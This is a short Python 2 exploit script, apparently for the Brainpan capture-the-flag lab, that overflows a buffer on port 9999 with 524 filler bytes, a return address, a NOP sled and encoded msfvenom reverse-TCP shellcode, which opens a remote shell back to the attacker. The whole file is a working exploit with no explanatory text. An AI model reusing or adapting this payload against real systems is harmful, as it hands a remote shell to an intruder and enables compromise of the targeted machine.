#!/usr/bin/env python2
import socket

#msfvenom -p linux/x86/shell_reverse_tcp lhost=0.0.0.0 lport=443 -b "\x00" EXITFUNC=thread -f python -a x86 -e x86/shikata_ga_nai
buf =  b""
buf += b"\xda\xde\xd9\x74\x24\xf4\x58\x2b\xc9\xbe\x9e\x4d\x1a"
buf += b"\x1d\xb1\x12\x83\xc0\x04\x31\x70\x13\x03\xee\x5e\xf8"
buf += b"\xe8\x3f\xba\x0b\xf1\x6c\x7f\xa7\x9c\x90\xf6\xa6\xd1"
buf += b"\xf2\xc5\xa9\x81\xa3\x65\x96\x68\xd3\xcf\x90\x8b\xbb"
buf += b"\xc5\x60\x67\xa4\xb2\x66\x77\xdb\xf9\xee\x96\x6b\x9b"
buf += b"\xa0\x09\xd8\xd7\x42\x23\x3f\xda\xc5\x61\xd7\x8b\xea"
buf += b"\xf6\x4f\x3c\xda\xd7\xed\xd5\xad\xcb\xa3\x76\x27\xea"
buf += b"\xf3\x72\xfa\x6d"

overflow = "A"*524
retorno = "\xf3\x12\x17\x31"
NOP = "\x90"*16
postfix = "\n"

buffer = overflow + retorno + NOP + buf + postfix

try:
        print "Done.".format(buffer)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("brainpan.thm", 9999))
        s.send(buffer)
        s.close
except:
        print ("Error!")
